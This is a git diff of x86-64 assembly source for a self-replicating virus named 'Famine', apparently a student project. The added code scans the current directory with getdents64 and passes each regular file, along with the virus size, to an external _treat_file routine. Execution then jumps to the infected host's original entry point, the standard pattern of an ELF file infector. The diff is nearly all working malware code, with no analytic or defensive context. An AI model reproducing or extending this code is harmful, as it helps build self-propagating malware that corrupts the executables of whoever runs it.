@@ -12,6 +12,7 @@
 section .text
 	global _start
 	global _string
+	global _read_dir
 	extern _treat_file
 	extern _final_end
 
@@ -22,6 +23,26 @@ _string:
 	db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0
 
 _start:
+	push rbp
+	mov rbp, rsp
+	sub rsp, 16
+	call _read_dir
+	lea r14, [rel _o_entry]
+	cmp QWORD [r14], 0
+	jne _jmp_to_o_entry
+	mov rax, 60 ; exit syscall number, will not be in final code
+	mov rdi, 0
+	syscall
+;	leave
+;	ret
+
+_jmp_to_o_entry:
+	leave
+;	add rsp, 16
+;	pop rbp
+	jmp [r14]
+
+_read_dir:
 	push rbp
 	mov rbp, rsp
 	sub rsp, 16
@@ -43,7 +64,7 @@ _calculate_virus_size:
 	mov QWORD [rsp + 280], r10 ; virus size = r10
 
 _open_dir:
-	push 0x00002f2e ; push "./"
+	push 0x0000000000002f2e ; push "./"
 	mov rdi, rsp ; mov the stack address on rdi, he first argument
 	xor rsi, rsi ; rsi = 0
 	xor rdx, rdx ; rdx = 0
@@ -51,7 +72,7 @@ _open_dir:
 	syscall ; open
 	pop rdi ; we pushed, so we pop
 	cmp rax, -1 ; if open return something under or equal of -1, jump to end
-	jle _end_famine
+	jle _end
 	mov QWORD [rsp + 288], rax ; fd directory = return of open (fd)
 
 _file_loop:
@@ -61,7 +82,7 @@ _file_loop:
 	mov rax, 217 ; getdents64 syscall number
 	syscall
 	cmp rax, 0 ; we check if getdents64 read something, if not, we are at the end of dir or their is an error
-	jle _end_famine
+	jle _end
 	mov r10, rax ; mov to r10 the number of bytes readed
 	add r10, rsp ; set the maximum theoric address for the readed datas (start buffer address + number of bytes read)
 	mov QWORD [rsp + 304], r10
@@ -81,24 +102,10 @@ _read_data:
 	mov r12b, BYTE [rsi + 18] ; at offset  
 	cmp r12, 8
 	jne _continue
-;	mov rdi, 1 ; write(1, ..., ...) ;
 	add rsi, 19 ; in the dirent struct, the name of te file is at offset 19
-;	xor rdx, rdx
-
-; counting string len
-;_count_str_size:
-;	cmp BYTE [rsi + rdx], 0
-;	je _continue_print
-;	inc rdx
-;	jmp _count_str_size
-
-;_continue_print:
-;	mov rax, 1 ; write syscall number
-;	syscall
 	mov rdi, rsi
 	mov rsi, QWORD [rsp + 280]
 	call _treat_file
-;	sub rsi, 19 ; decrease offset
 	mov rsi, [rsp + 296]
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
@@ -108,17 +115,7 @@ _continue:
 	add rsi, r11 ; we add this len on our current struct address to access next struct
 	mov QWORD [rsp + 296], rsi
 	jmp _read_data
-	
-_end_famine:
-	lea r10, [rel _o_entry]
-	cmp QWORD [r10], 0
-	jne _jmp_to_o_entry
-	mov rax, 60 ; exit syscall number, will not be in final code
-	mov rdi, 0
-	syscall
+
+_end:
 	leave
 	ret
-
-_jmp_to_o_entry:
-	leave
-	jmp [r10]
